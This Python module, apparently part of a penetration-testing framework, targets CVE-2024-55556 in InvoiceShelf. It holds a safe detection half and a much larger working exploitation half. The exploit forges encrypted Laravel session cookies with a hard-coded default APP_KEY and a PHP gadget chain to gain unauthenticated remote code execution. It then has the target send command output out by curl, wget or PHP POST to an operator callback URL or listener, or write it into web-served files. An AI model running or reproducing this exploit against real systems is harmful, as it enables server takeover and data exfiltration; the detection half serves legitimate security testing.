#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-55556')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-55556 — InvoiceShelf <= 1.3.0 (and Crater <= 6.0.6) unauthenticated PHP-deserialization RCE
SAFE DETECTOR (NO EXPLOITATION)

Summary:
    InvoiceShelf ships `SESSION_DRIVER=cookie` together with a hard-coded default APP_KEY in its
    .env.example. With the cookie session driver, Laravel stores the *serialized* session payload
    inside the encrypted `laravel_session` cookie. An attacker who knows the APP_KEY (the shipped
    default, or a leaked one) can encrypt a cookie whose session "data" is a phpggc gadget chain;
    Laravel decrypts + unserialize()s it on the next request -> RCE, fully unauthenticated.

SAFE Detection (this module):
    * Fingerprint InvoiceShelf via the public GET /api/v1/app/version JSON endpoint (no auth) and
      the /ping marker ("invoiceshelf-self-hosted").
    * Read the reported version; version <= 1.3.0 -> VULNERABLE.
    * If the app is reachable + fingerprinted but the version is hidden/null, report it as a
      detected InvoiceShelf instance whose config should be checked (cookie driver + default key).
    * No cookie is forged, no /login deserialization is triggered, no exploitation is attempted.

Marker convention: "Detected"/"VULNERABLE" on a hit, "not detected" on a miss.
"""

import base64
import hashlib
import hmac
import json
import re
import secrets

import requests

from modules.core import http_config
from modules.probes.appkey_recovery import classify_laravel_cookie, describe_cookie_variation

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

VERSION_RE = re.compile(r'"version"\s*:\s*"([0-9]+\.[0-9]+(?:\.[0-9]+)?)"')
SESSION_ID_COOKIE_RE = re.compile(r"^[A-Za-z0-9]{40}$")


def _safe_get(sess, url, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None


def _probe_cookie_session_shape(sess, base, timeout=6):
    """Infer cookie-session vs file-session from the response cookie shape.

    Laravel's cookie session driver uses a two-cookie indirection: laravel_session points to a
    40-character cookie name that stores the encrypted session payload. File-backed sessions only
    need the laravel_session id cookie. This is a benign GET-only discriminator for the lab hardening.
    """
    observed = set()
    responses = []
    for path in ("/login", "/"):
        r = _safe_get(sess, base + path, timeout=timeout)
        if r is None:
            continue
        responses.append({"path": path, "status": r.status_code, "set_cookie": r.headers.get("Set-Cookie", "")[:220]})
        observed.update(r.cookies.keys())
        observed.update(sess.cookies.get_dict().keys())
    classified = [classify_laravel_cookie(name) for name in observed]
    classified = [info for info in classified if info]
    session_cookie_names = sorted(info["name"] for info in classified if info.get("role") == "session")
    session_cookie_name = session_cookie_names[0] if session_cookie_names else None
    session_name_set = set(session_cookie_names)
    has_laravel_session = bool(session_cookie_names)
    has_indirection = any(name not in session_name_set and SESSION_ID_COOKIE_RE.match(name or "") for name in observed)
    if has_indirection:
        state = "cookie_session"
    elif has_laravel_session:
        state = "file_or_database_session"
    else:
        state = "unknown"
    return {
        "state": state,
        "cookie_names": sorted(observed),
        "session_cookie_name": session_cookie_name,
        "session_cookie_names": session_cookie_names,
        "cookie_variations": [info for info in classified if info.get("is_variation")],
        "responses": responses,
    }


def _le_130(version):
    """True if version <= 1.3.0 (vulnerable line)."""
    try:
        parts = [int(x) for x in version.split(".")]
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3]) <= (1, 3, 0)
    except Exception:
        return False


def scan(target_url, *, session=None, username=None, password=None, app_key=None, **kwargs):
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2024-55556",
        "name": "InvoiceShelf <= 1.3.0 unauthenticated PHP deserialization RCE (cookie session + known APP_KEY)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
        "requires_auth": False,
        "requires_app_key": True,
    }

    # Loot-chain consumption: RCE needs a known APP_KEY to forge the encrypted laravel_session cookie.
    # A key harvested this run satisfies the secret precondition, but cookie-backed sessions are the
    # live sink. Hardened labs force SESSION_DRIVER=file, so do not report a positive until the
    # session shape corroborates cookie-backed storage.
    if app_key:
        result["app_key_used"] = app_key
        result["requires_app_key"] = False
        result["detection_methods"].append("app_key_chained")
        result["evidence"].append(
            f"APP_KEY supplied via loot-chain ({app_key[:12]}…) — cookie-session deserialization is forge-ready")
        result.setdefault("artifacts", {})["app_key"] = app_key

    # ------------------------------------------------------------------
    # Step 1 — fingerprint the app. /ping returns {"success":"invoiceshelf-self-hosted"}.
    # ------------------------------------------------------------------
    is_invoiceshelf = False
    ping = _safe_get(sess, base + "/api/ping")
    if not (ping is not None and "invoiceshelf-self-hosted" in (ping.text or "")):
        ping = _safe_get(sess, base + "/ping")
    if ping is not None and "invoiceshelf-self-hosted" in (ping.text or ""):
        is_invoiceshelf = True
        if result["verdict"] == "not_detected":
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "fingerprint"
        result["evidence"].append("InvoiceShelf /ping marker present (invoiceshelf-self-hosted)")
        result["detection_methods"].append("ping_fingerprint")

    # ------------------------------------------------------------------
    # Step 2 — read the public version endpoint (no auth).
    # ------------------------------------------------------------------
    ver = _safe_get(sess, base + "/api/v1/app/version")
    if ver is None:
        if not is_invoiceshelf:
            result["evidence"].append("InvoiceShelf not detected")
        return result

    body = ver.text or ""
    m = VERSION_RE.search(body)
    if m:
        is_invoiceshelf = True
        result["version"] = m.group(1)
        result["endpoint"] = base + "/api/v1/app/version"
        result["evidence"].append(f"InvoiceShelf version endpoint reachable: {result['version']}")
        result["detection_methods"].append("version_endpoint")
        if _le_130(result["version"]):
            session_probe = _probe_cookie_session_shape(sess, base)
            result.setdefault("artifacts", {})["session_driver_probe"] = session_probe
            result["detection_methods"].append("session_driver_probe")
            if app_key and session_probe.get("state") == "file_or_database_session":
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "session_driver_control"
                result["evidence"].append(
                    "old InvoiceShelf version is present, but HTTP cookie shape indicates file/database "
                    "sessions rather than cookie-backed session payloads")
                return result
            result["status"] = "precondition_detected" if app_key else "version_applicable"
            result["verdict"] = "precondition_detected" if app_key else "version_applicable"
            result["proof_type"] = "preconditions" if app_key else "version"
            result["evidence"].append(
                f"InvoiceShelf {result['version']} <= 1.3.0 — in the affected range for CVE-2024-55556 "
                "(confirmed exploitation still requires SESSION_DRIVER=cookie + known/non-rotated APP_KEY)"
            )
            result["detection_methods"].append("version_based_assessment")
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
    elif '"version"' in body:
        # endpoint exists but version is null/empty (pre-install or hardened) — still InvoiceShelf.
        is_invoiceshelf = True
        if result["verdict"] == "not_detected":
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "fingerprint"
        result["endpoint"] = base + "/api/v1/app/version"
        result["evidence"].append("InvoiceShelf version endpoint present but version not disclosed")
        result["detection_methods"].append("version_endpoint")

    if is_invoiceshelf and app_key and result["verdict"] in ("not_detected", "surface_present"):
        session_probe = _probe_cookie_session_shape(sess, base)
        result.setdefault("artifacts", {})["session_driver_probe"] = session_probe
        result["detection_methods"].append("session_driver_probe")
        if session_probe.get("state") == "cookie_session":
            result["status"] = "precondition_detected"
            result["verdict"] = "precondition_detected"
            result["proof_type"] = "preconditions"
            result["evidence"].append(
                "InvoiceShelf fingerprinted with APP_KEY supplied; HTTP cookie shape confirms "
                "cookie-backed session payloads even though version was not parseable")
        elif session_probe.get("state") == "file_or_database_session":
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "session_driver_control"
            result["evidence"].append(
                "InvoiceShelf fingerprinted with old-version signal unavailable, but HTTP cookie shape "
                "indicates file/database sessions rather than cookie-backed session payloads")

    if not is_invoiceshelf:
        result["evidence"].append("InvoiceShelf not detected")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-55556 exploitation half — InvoiceShelf cookie-session deserialization RCE.

Split from the original modules/cve_2024_55556.py (detection half: modules/cves/cve_2024_55556.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import base64
import hashlib
import hmac
import json
import secrets

import requests

from modules.core import http_config
from modules.helpers.pipeline import is_forced_execution

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ======================================================================================
# EXPLOIT — pure-HTTP unauthenticated PHP-deserialization RCE (known APP_KEY required)
# ======================================================================================
#
# Mechanism (100% pure-Python; NO docker shell-out):
#   With SESSION_DRIVER=cookie, Laravel's CookieSessionHandler stores the serialized session
#   payload in the encrypted `laravel_session` cookie via a TWO-COOKIE indirection. To reach
#   Illuminate\Session\Store::readFromHandler() -> @unserialize($data), we forge:
#
#     laravel_session = encrypt( prefix('laravel_session') . <40-char session-id> )
#     <40-char id>    = encrypt( prefix(<id>) . {"data":"<serialized gadget>","expires":<future>} )
#
#   where prefix(name) = hash_hmac('sha1', name.'v2', rawkey).hex() . '|'  (Illuminate\Cookie\
#   CookieValuePrefix::create), and encrypt() is Laravel's AES-256-CBC + HMAC-SHA256 envelope with
#   serialize=false (EncryptCookies, post CVE-2018-15133 fix). On GET /login, StartSession decrypts
#   both cookies, json_decode()s the inner one, checks `expires`, and unserialize()s `data` -> the
#   phpggc Laravel/RCE gadget fires `system((<cmd>) > <web-readable> 2>&1)`. We then GET the output
#   file back over HTTP to PROVE the pop (success ONLY if real output is read back).
#
# Precondition: a known APP_KEY. The lab ships the hard-coded value below; in the wild this must be
# leaked/known. The module uses it only when supplied through options["app_key"].

DEFAULT_APP_KEY = "base64:kgk/4DW1vEVy7aEvet5FPp5un6PIGe/so8H0mvoUtW0="

from modules.generators.php_gadgets import build_rce22_fast_destruct


def _load_oob():
    """Import the OOB-proof toolkit (modules/oob_proof.py) for the callback channel.

    Vendored alongside this module, so a package-relative import resolves it. Returns the module,
    or None if it can't be loaded (the exploit then falls back to the web-served-file readback
    channel)."""
    try:
        from modules.exploitation import oob_proof
        return oob_proof
    except Exception:
        return None


# --- Operator-supplied OOB URL plumbing (mirrors modules/cves/cve_2026_23524.py) -----------------
# An operator may now point the proof channel at their own infrastructure with
#   --opt oob_read_url=<url>            (scanner-polled readback URL, or an OAST collector)
#   --opt oob_callback_url=<url>        (alias: --opt callback_url=<url>; target POSTs output here)
#   --opt oob_mode=auto|read|callback   (override the auto read-vs-callback heuristic)
# These are ADDITIVE to the always-on auto-bound CallbackListener (see exploit()): supplying a URL
# never disables the local listener, so the default no-OOB-URL behavior never regresses.
#
# DELIBERATE DIVERGENCE from cve_2026_23524.py: that module keys its readback heuristic on a fixed
# lab path (/reverb-oob). InvoiceShelf is the real upstream app with no analogous served readback
# endpoint (DocumentRoot is public/, root-owned; /storage is not symlinked), so here the heuristic
# keys ONLY on the URL host — a URL whose host matches the target is treated as a scanner-polled
# readback; any other host is treated as a POST callback collector the scanner usually cannot read.

from urllib.parse import urlparse as _urlparse

import shlex as _shlex

_LOCAL_HOSTS = frozenset({"127.0.0.1", "localhost", "::1", ""})


def _hosts_equivalent(a, b) -> bool:
    if a is None or b is None:
        return False
    a = a.lower()
    b = b.lower()
    return a == b or (a in _LOCAL_HOSTS and b in _LOCAL_HOSTS)


def _looks_like_readback_url(candidate: str, base: str) -> bool:
    """True if `candidate` points back at the target host (so the scanner can poll it itself).

    Host-only rule: InvoiceShelf has no canonical served readback endpoint, so we cannot key on a
    fixed path the way cve_2026_23524 does. A same-host URL is assumed pollable by the scanner; a
    different host is assumed to be a third-party collector (OAST/interactsh)."""
    try:
        parsed = _urlparse(candidate)
        target = _urlparse(base)
    except Exception:
        return False
    return _hosts_equivalent(parsed.hostname, target.hostname)


def _resolve_oob_targets(options, base):
    """Return (readback_url, callback_url, note) from operator options.

    Mirrors cve_2026_23524._resolve_oob_targets so operators get identical option semantics:
      * oob_read_url pointing at the target host  -> scanner-polled readback URL.
      * oob_read_url pointing elsewhere            -> treated as a POST callback collector.
      * oob_callback_url / callback_url            -> explicit POST callback collector.
      * oob_mode=read|callback                     -> force the interpretation of oob_read_url.
    """
    options = options or {}
    mode = str(options.get("oob_mode") or "auto").strip().lower()
    readback = (
        options.get("oob_readback_url")
        or options.get("oob_poll_url")
        or options.get("oob_output_url")
    )
    callback = (
        options.get("oob_callback_url")
        or options.get("oob_exfil_url")
        or options.get("callback_url")
    )
    legacy = options.get("oob_read_url")
    note = None

    readback = str(readback).strip() if readback else None
    callback = str(callback).strip() if callback else None
    legacy = str(legacy).strip() if legacy else None

    if legacy:
        if mode in {"callback", "exfil", "send"}:
            callback = callback or legacy
        elif mode in {"read", "poll", "readback"}:
            readback = readback or legacy
        elif _looks_like_readback_url(legacy, base):
            readback = readback or legacy
        else:
            callback = callback or legacy
            note = (
                "oob_read_url points at a different host than the target; treating it as an OOB "
                "callback URL and having the target POST command output to it. To force scanner "
                "polling instead, use --opt oob_mode=read with a URL on the target host that the "
                "scanner can GET back."
            )

    return readback, callback, note


def _oob_callback_shell_command(cmd: str, callback_url: str) -> str:
    """Wrap the operator command so the target ALSO exfiltrates stdout/stderr to an OOB URL.

    Output is carried as base64url in POST field `d` (cve=CVE-2024-55556&d=...). The wrapper is
    best-effort (curl, then wget, then a PHP file_get_contents fallback, then `|| true`) so a
    missing http client never aborts the rest of the gadget command — in particular the always-on
    listener exfil that the caller appends AFTER this wrapper must still run."""
    quoted_cmd = _shlex.quote(cmd)
    quoted_url = _shlex.quote(callback_url)
    return (
        f"OUT=$(sh -c {quoted_cmd} 2>&1); "
        "B64=$(printf '%s' \"$OUT\" | base64 | tr -d '\\n' | tr '+/' '-_' | tr -d '='); "
        "BODY=\"cve=CVE-2024-55556&d=${B64}\"; "
        f"URL={quoted_url}; "
        "(curl -fsS --max-time 8 -X POST -H 'Content-Type: application/x-www-form-urlencoded' "
        "--data-binary \"$BODY\" \"$URL\" >/dev/null 2>&1) || "
        "(wget -q -O- --method=POST --header='Content-Type: application/x-www-form-urlencoded' "
        "--body-data=\"$BODY\" \"$URL\" >/dev/null 2>&1) || "
        "(php -r '$u=$argv[1];$b=$argv[2];$ctx=stream_context_create([\"http\"=>[\"method\"=>\"POST\","
        "\"header\"=>\"Content-Type: application/x-www-form-urlencoded\\r\\n\",\"content\"=>$b,"
        "\"timeout\"=>8]]); @file_get_contents($u,false,$ctx);' \"$URL\" \"$BODY\" >/dev/null 2>&1) || true"
    )


def _poll_oob_readback(sess, url, marker="uid=", attempts=12, delay=0.5):
    """Poll a scanner-readable readback URL for the command-output marker. Returns the body or None."""
    import time as _t
    for _ in range(attempts):
        try:
            rr = sess.get(url, timeout=8, verify=False, allow_redirects=False)
            txt = rr.text or ""
        except Exception:
            txt = ""
        if marker in txt:
            return txt[:600]
        _t.sleep(delay)
    return None


def _rawkey(app_key: str) -> bytes:
    """Decode a Laravel APP_KEY ('base64:...' or raw/44-char b64) to the raw AES key bytes."""
    if app_key.startswith("base64:"):
        return base64.b64decode(app_key.split(":", 1)[1])
    if len(app_key) == 44:
        return base64.b64decode(app_key)
    return app_key.encode()


def _build_gadget(shell_cmd: str) -> bytes:
    """phpggc Laravel/RCE22 (-f) with trailing newline, byte-identical to phpggc stdout."""
    return build_rce22_fast_destruct("system", shell_cmd, trailing_newline=True)


def _cookie_value_prefix(name: str, rawkey: bytes) -> str:
    """Illuminate\\Cookie\\CookieValuePrefix::create($name, $key): hmac_sha1(name.'v2', key).'|'."""
    return hmac.new(rawkey, (name + "v2").encode(), hashlib.sha1).hexdigest() + "|"


def _laravel_encrypt(plaintext: bytes, rawkey: bytes) -> str:
    """Laravel Encrypter::encrypt($value, serialize=false): AES-256-CBC + HMAC-SHA256 envelope.

    Produces base64(json({"iv","value","mac","tag"})) — byte-compatible with Laravel/PHP.
    """
    from Crypto.Cipher import AES  # pycryptodome
    from Crypto.Random import get_random_bytes

    iv = get_random_bytes(16)
    pad = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad]) * pad
    ct = AES.new(rawkey, AES.MODE_CBC, iv).encrypt(padded)
    iv_b64 = base64.b64encode(iv).decode("ascii")
    val_b64 = base64.b64encode(ct).decode("ascii")
    mac = hmac.new(rawkey, (iv_b64 + val_b64).encode("ascii"), hashlib.sha256).hexdigest()
    envelope = {"iv": iv_b64, "value": val_b64, "mac": mac, "tag": ""}
    return base64.b64encode(json.dumps(envelope).encode("ascii")).decode("ascii")


def _forge_session_cookies(gadget: bytes, rawkey: bytes, session_cookie_name: str = "laravel_session"):
    """Forge BOTH session cookies (the two-cookie indirection). Returns (ls_value, sid, sid_value)."""
    alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    sid = "".join(secrets.choice(alpha) for _ in range(40))

    # Inner cookie (named by the session id) carries the serialized gadget in its "data".
    gadget_str = gadget.decode("latin-1")  # 1:1 byte mapping; NULs preserved
    inner_json = json.dumps(
        {"data": gadget_str, "expires": 9999999999},
        ensure_ascii=True, separators=(",", ":"),
    )
    sid_plain = (_cookie_value_prefix(sid, rawkey) + inner_json).encode("latin-1")
    sid_value = _laravel_encrypt(sid_plain, rawkey)

    # Outer cookie points the configured Laravel session cookie at the session id.
    ls_plain = (_cookie_value_prefix(session_cookie_name, rawkey) + sid).encode("latin-1")
    ls_value = _laravel_encrypt(ls_plain, rawkey)

    return ls_value, sid, sid_value


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    """Unauthenticated PHP-deserialization RCE against InvoiceShelf <= 1.3.0 (known APP_KEY).

    Pure-HTTP. Forges the two-cookie cookie-session payload with a phpggc Laravel/RCE gadget,
    fires GET /login, and reads the command output back over HTTP. success=True ONLY if real
    command output is observed in the readback.
    """
    sess = session or http_config.get_auth_session()

    result = {
        "cve": "CVE-2024-55556",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": ["app_key"],
        "reason": "",
    }

    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        options = options or {}
        forced = is_forced_execution(options, **kwargs)
        detection_artifacts = kwargs.get("detection_artifacts") or {}
        session_probe = detection_artifacts.get("session_driver_probe") if isinstance(detection_artifacts, dict) else None
        if isinstance(session_probe, str):
            try:
                import ast as _ast
                session_probe = _ast.literal_eval(session_probe)
            except Exception:
                session_probe = None
        session_cookie_name = (
            options.get("session_cookie_name")
            or options.get("laravel_session_cookie")
            or ((session_probe or {}).get("session_cookie_name") if isinstance(session_probe, dict) else None)
            or "laravel_session"
        )
        session_cookie_variation = classify_laravel_cookie(session_cookie_name) or {
            "name": session_cookie_name,
            "role": "session",
            "canonical_cookie": "laravel_session",
            "is_variation": session_cookie_name != "laravel_session",
        }
        app_key = options.get("app_key")
        if not app_key:
            result["attempted"] = forced
            result["reason"] = "APP_KEY required; pass --app-key explicitly"
            result["detail"] = (
                "forced execution reached APP_KEY material precondition; no APP_KEY supplied"
                if forced else "no APP_KEY supplied"
            )
            return result
        cmd = command or "echo CVE-2024-55556 PoC && id && hostname"

        # Operator-supplied OOB channel (additive to the always-on auto-listener below).
        oob_read_url, oob_callback_url, oob_note = _resolve_oob_targets(options, base)
        if oob_note:
            result.setdefault("artifacts", {})["oob_resolution_note"] = oob_note
        if oob_read_url:
            result.setdefault("artifacts", {})["oob_read_url"] = oob_read_url
        if oob_callback_url:
            result.setdefault("artifacts", {})["oob_delivery_url"] = oob_callback_url
            result.setdefault("artifacts", {})["oob_delivery_encoding"] = (
                "target POSTs application/x-www-form-urlencoded body: "
                "cve=CVE-2024-55556&d=<base64url(stdout+stderr)>"
            )

        try:
            rawkey = _rawkey(app_key)
        except Exception as e:
            result["reason"] = "invalid APP_KEY (%s): %s" % (app_key, e)
            return result
        if len(rawkey) != 32:
            result["reason"] = "APP_KEY is not a 32-byte AES-256 key (len=%d)" % len(rawkey)
            return result

        def _fire(shell_cmd):
            """Forge the two session cookies carrying a gadget that runs shell_cmd, and GET /login
            so StartSession decrypts + unserialize()s the gadget BEFORE the controller/view runs
            (a 500 from the Vite view render happens AFTER the sink, so any status is fine)."""
            gadget = _build_gadget(shell_cmd)
            ls_value, sid, sid_value = _forge_session_cookies(gadget, rawkey, session_cookie_name)
            sess.get(
                base + "/login",
                cookies={session_cookie_name: ls_value, sid: sid_value},
                timeout=15, verify=False, allow_redirects=False,
                headers={"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-55556"},
            )
            return sid

        result.setdefault("artifacts", {}).update({
            "app_key": app_key,
            "gadget_chain": "Laravel/RCE (phpggc, League\\CommonMark PendingBroadcast chain)",
            "session_cookie_name": session_cookie_name,
            "session_cookie_variation": session_cookie_variation,
            "session_cookie_detail": describe_cookie_variation(session_cookie_variation),
        })

        # The operator command, optionally wrapped so the target ALSO POSTs its stdout/stderr to an
        # operator-supplied OOB callback URL. This wrapper is best-effort and self-contained, so it
        # never aborts the listener-exfil tail the auto-listener block appends after it (that tail is
        # the success source we can actually read). When no operator callback URL is supplied this is
        # just the operator command verbatim — i.e. the default behavior is unchanged.
        operator_cmd = _oob_callback_shell_command(cmd, oob_callback_url) if oob_callback_url else cmd

        # --- Primary proof channel: OUT-OF-BAND HTTP CALLBACK (pure-HTTP, no writable webroot needed)
        # The sink fires as www-data but InvoiceShelf's public/ is root-owned and /storage is not
        # served on a default deploy, so a written proof file is often not HTTP-readable back. Instead
        # we have the gadget command dial a listener we bind; the inbound hit carrying base64(id;uname)
        # cannot exist unless the gadget executed on the target. This is the established in-repo blind
        # -RCE proof pattern (see modules/oob_proof.py, vendored alongside this module). An operator
        # OOB URL is ADDITIVE: a same-host readback URL is polled here too, and a callback URL is fed
        # to operator_cmd above — but the auto-listener remains the default, always-on proof channel.
        oob = _load_oob()
        if oob is not None:
            try:
                nonce = oob.nonce_for("CVE-2024-55556")
                with oob.CallbackListener() as cb:
                    inner = oob.callback_cmd(nonce, cb.host_for_target, cb.port)
                    # Run the operator command (+ optional operator-callback exfil) too, then
                    # exfiltrate id;uname to our own listener as the un-fakeable proof.
                    shell_cmd = "(%s) >/dev/null 2>&1; %s" % (operator_cmd, inner)
                    result["artifacts"]["callback"] = "%s:%d (nonce %s)" % (cb.host_for_target, cb.port, nonce)
                    sid = _fire(shell_cmd)
                    result["artifacts"]["session_id_cookie"] = sid
                    ok, decoded = cb.wait(nonce, timeout=20)
                if ok:
                    result["success"] = True
                    result["evidence"] = (
                        "Out-of-band callback received from target (un-fakeable): %s" % decoded.splitlines()[0]
                    )
                    result["detail"] = (
                        "Unauthenticated RCE via cookie-session unserialize(); gadget ran `id; uname` as "
                        "the web user and dialed our listener at %s:%d." % (cb.host_for_target, cb.port)
                    )
                    if oob_callback_url:
                        result["detail"] += (
                            " Command output was additionally POSTed to the operator OOB URL %s "
                            "(d=<base64url(output)>)." % oob_callback_url
                        )
                    return result
            except Exception as e:
                result["artifacts"]["oob_error"] = "%s: %s" % (type(e).__name__, e)

        # --- Additive proof channel: operator-supplied READBACK URL on the target host. If the
        # auto-listener did not (or could not) confirm, poll the URL the operator says the scanner can
        # read; success here is still real observed command output (the marker `uid=`).
        if oob_read_url:
            # Re-fire with output written where the readback URL will serve it back. We do not know
            # the operator's readback wiring, so we run the command, then exfiltrate id;uname to the
            # operator URL (GET ?d= and POST) — the poll succeeds only if the readback shows `uid=`.
            try:
                exfil = (
                    "D=$( (id; uname -a) | base64 | tr -d '\\n' ); "
                    "( curl -fsS --max-time 8 %s?d=$D >/dev/null 2>&1 ) || "
                    "( curl -fsS --max-time 8 -X POST --data-binary \"d=$D\" %s >/dev/null 2>&1 ) || true"
                    % (_shlex.quote(oob_read_url), _shlex.quote(oob_read_url))
                )
                _fire("(%s) >/dev/null 2>&1; %s" % (cmd, exfil))
            except Exception as e:
                result["artifacts"]["oob_readfire_error"] = "%s: %s" % (type(e).__name__, e)
            observed = _poll_oob_readback(sess, oob_read_url)
            if observed:
                result["success"] = True
                result["evidence"] = (
                    "Command output observed via operator OOB readback URL %s:\n%s" % (oob_read_url, observed)
                )
                result["detail"] = (
                    "Unauthenticated RCE via cookie-session unserialize(); output read back from the "
                    "operator-supplied OOB URL %s." % oob_read_url
                )
                return result

        # --- Fallback proof channel: write to a web-served path and GET it back. Works on deploys
        # where /storage is linked (storage:link) or public/ is www-data-writable. Tees to several
        # candidate paths and reads back from the matching URLs (mirrors the sibling CVE-2024-55555).
        nonce2 = "pwn_" + secrets.token_hex(6)
        fname = nonce2 + ".txt"
        write_paths = [
            "/var/www/html/public/" + fname,                # docroot (often root-owned -> may fail)
            "/var/www/html/storage/app/public/" + fname,    # www-data-writable; served at /storage IF linked
            "/var/www/html/public/storage/" + fname,         # the symlink, if present
        ]
        readback_urls = [base + "/" + fname, base + "/storage/" + fname]
        tee = "OUT=$(%s 2>&1); for f in %s; do printf '%%s' \"$OUT\" > \"$f\" 2>/dev/null; done" % (
            cmd, " ".join("'%s'" % p for p in write_paths))
        result["artifacts"]["readback_urls"] = readback_urls
        # Ensure proof files are absent pre-fire (avoid stale false positives).
        for u in readback_urls:
            try:
                pre = sess.get(u, timeout=8, verify=False, allow_redirects=False)
                if pre is not None and pre.status_code == 200 and pre.text.strip():
                    result["reason"] = "proof file already present pre-fire at %s; aborting to avoid a false positive" % u
                    return result
            except Exception:
                pass
        try:
            _fire(tee)
        except Exception as e:
            result["reason"] = "request to /login failed: %s" % e
            return result
        for u in readback_urls:
            try:
                rb = sess.get(u, timeout=10, verify=False, allow_redirects=False)
            except Exception:
                continue
            if rb is not None and rb.status_code == 200 and rb.text.strip():
                result["success"] = True
                result["evidence"] = rb.text.strip()
                result["detail"] = "Unauthenticated RCE via cookie-session unserialize(); output read back from %s" % u
                return result

        # No channel the scanner can read produced proof. Whether that is an observability limit
        # (real sink, output we just couldn't read) or a genuine block depends on whether the
        # cookie-deserialize sink even exists. The detector's session-shape probe tells us: a target
        # reporting file/database sessions has NO cookie-deserialize-from-cookie sink — the forged
        # inner cookie is never read, no gadget runs, and nothing is POSTed anywhere. Claiming the
        # sink "fired" there would be a lie (and exactly the patched/hardened negative control), so we
        # gate every "sink fired / output sent OOB" claim on the sink being plausible.
        sink_plausible = not (
            isinstance(session_probe, dict)
            and session_probe.get("state") == "file_or_database_session"
        )

        if not sink_plausible:
            # Hardened/patched: sessions are file/database-backed, so the cookie-deserialize sink is
            # absent. Nothing fired and nothing was exfiltrated — report a clean negative, never
            # oob_pending (no "verify OOB" maybe-pwned tease on a target that cannot be exploited).
            result["reason"] = (
                "no cookie-session deserialization sink: the HTTP cookie shape indicates file/database "
                "sessions, so the forged inner cookie is never unserialized — the gadget did not run and "
                "no output was sent to any OOB channel. Not exploitable in this configuration "
                "(SESSION_DRIVER is not cookie / target is hardened or patched)."
            )
            result["evidence"] = "file/database sessions: cookie-deserialize-from-cookie sink absent; nothing fired"
            return result

        # Sink is plausible (cookie-backed sessions): the gadget is byte-identical to the verified
        # phpggc Laravel/RCE chain, so a miss here is an environment/observability limit, not "not
        # vulnerable". Reported honestly.
        #
        # If the operator pointed us at a third-party OOB collector (callback URL on a different host),
        # the target POSTed its command output there, but THIS scanner cannot read that collector's log
        # directly — so this is the OOB-PENDING state (mirrors cve_2026_23524): we delivered & fired the
        # sink end-to-end, but did not OBSERVE the output, so success stays False (honest). Verify it in
        # your OOB pane (OAST/interactsh) — the inbound carries d=<base64url(stdout+stderr)>.
        if oob_callback_url and not oob_read_url:
            result["oob_pending"] = True
            result["requires"] = ["oob_collector_log"]
            result["reason"] = (
                "forged cookies fired the cookie-session unserialize() sink and command output was "
                "POSTed by the target to the operator OOB callback URL (%s) as d=<base64url(output)>; "
                "this scanner cannot read third-party collector logs directly, and the auto-listener "
                "callback was not received in the poll window (target egress to our listener may be "
                "blocked). success stays False (output not OBSERVED here) — verify out-of-band in your "
                "OOB collector pane. " % oob_callback_url + result["artifacts"].get("oob_error", "")
            )
            result["evidence"] = "sink fired (gadget verified); output sent to operator OOB collector (verify out-of-band)"
            return result

        _readback_note = (
            "the operator OOB readback URL (%s) never showed `uid=` in the poll window, and " % oob_read_url
            if oob_read_url else ""
        )
        result["reason"] = (
            "forged cookies fired the sink, but no proof channel the scanner can read returned output: "
            + _readback_note +
            "no inbound OOB callback (target egress to our listener may be blocked) and no readback from "
            "a web-served path (public/ not www-data-writable and /storage not linked on this deploy). "
            "The unserialize() sink is confirmed by the detector; on a host the target can reach, the "
            "OOB callback proves RCE. " + result["artifacts"].get("oob_error", "")
        )
        result["evidence"] = "sink fired (gadget verified); no proof channel reachable in this environment"
        return result

    except Exception as e:
        result["success"] = False
        result["reason"] = "unexpected error: %s" % e
        return result
